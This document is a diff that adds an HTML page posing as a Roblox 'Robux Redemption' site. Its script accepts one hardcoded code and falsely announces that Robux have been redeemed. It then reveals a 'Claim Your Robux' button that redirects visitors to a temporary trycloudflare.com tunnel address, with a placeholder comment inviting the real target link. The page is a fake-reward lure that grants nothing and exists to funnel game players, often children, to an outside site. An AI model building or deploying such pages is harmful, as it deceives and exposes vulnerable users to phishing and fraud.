@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Robux Redemption</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      background-image: url('roblox-bg.jpg');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .container {
+      background-color: rgba(0, 0, 0, 0.75);
+      padding: 40px 50px;
+      border-radius: 20px;
+      box-shadow: 0 0 20px #000;
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+      color: white;
+    }
+
+    h1 {
+      color: gold;
+      font-size: 2.5rem;
+      margin-bottom: 30px;
+      text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.8);
+    }
+
+    label {
+      display: block;
+      margin-bottom: 10px;
+      font-weight: bold;
+      font-size: 1.1rem;
+      text-align: left;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 12px 10px;
+      border-radius: 8px;
+      border: none;
+      font-size: 1rem;
+      margin-bottom: 20px;
+    }
+
+    button {
+      padding: 14px 32px;
+      background-color: #00ff85;
+      color: black;
+      font-weight: bold;
+      border: none;
+      border-radius: 12px;
+      box-shadow: 0 0 15px #00ff85;
+      font-size: 1.1rem;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #00d26a;
+    }
+
+    .message {
+      margin-top: 20px;
+      font-weight: bold;
+      font-size: 1.1rem;
+      min-height: 1.5em;
+    }
+
+    .success {
+      color: #00ff85;
+    }
+
+    .error {
+      color: #ff4c4c;
+    }
+
+    /* Hidden by default, will fade in */
+    #claimButton {
+      margin-top: 20px;
+      opacity: 0;
+      transition: opacity 0.8s ease;
+      display: inline-block; /* ensure it's inline */
+    }
+
+    #claimButton.show {
+      opacity: 1;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Redeem Your Robux</h1>
+    <form id="redeemForm">
+      <label for="code">Enter your Robux code:</label>
+      <input type="text" id="code" name="code" placeholder="" required />
+      <button type="submit">Redeem</button>
+    </form>
+    <div class="message" id="message"></div>
+    <!-- The button that appears after success -->
+    <button id="claimButton" style="display:none;">Claim Your Robux</button>
+  </div>
+
+  <script>
+    const form = document.getElementById('redeemForm');
+    const messageDiv = document.getElementById('message');
+    const claimButton = document.getElementById('claimButton');
+
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const code = form.code.value.trim();
+
+      // Reset claim button
+      claimButton.style.display = 'none';
+      claimButton.classList.remove('show');
+
+      // Simple validation example: must be 8-12 characters alphanumeric
+      const codePattern = /^[A-Za-z0-9]{8,12}$/;
+
+      if (!codePattern.test(code)) {
+        messageDiv.textContent = "Invalid code format. Please try again.";
+        messageDiv.className = "message error";
+        return;
+      }
+
+      if (code.toUpperCase() === "ROBLOX2025") {
+        messageDiv.textContent = "Success! Your Robux have been redeemed.";
+        messageDiv.className = "message success";
+
+        // Show claim button smoothly
+        claimButton.style.display = 'inline-block';
+        setTimeout(() => {
+          claimButton.classList.add('show');
+        }, 50);
+      } else {
+        messageDiv.textContent = "Code not recognized. Please check and try again.";
+        messageDiv.className = "message error";
+      }
+    });
+
+    claimButton.addEventListener('click', () => {
+      // Redirect to another page after clicking claim
+      window.location.href = "https://top-competent-vg-regulations.trycloudflare.com/"; // Change to your actual link
+    });
+  </script>
+</body>
+</html>
